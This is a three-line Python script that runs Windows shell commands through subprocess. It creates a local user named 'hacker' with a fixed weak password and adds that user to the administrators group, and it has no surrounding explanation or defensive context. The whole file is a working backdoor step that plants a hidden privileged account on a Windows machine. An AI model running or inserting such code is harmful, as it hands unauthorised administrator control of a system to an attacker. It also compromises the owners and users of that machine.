import subprocess
subprocess.Popen('net user hacker P@ssw0rd /add', shell=True)
subprocess.Popen('net localgroup administrators hacker /add', shell=True)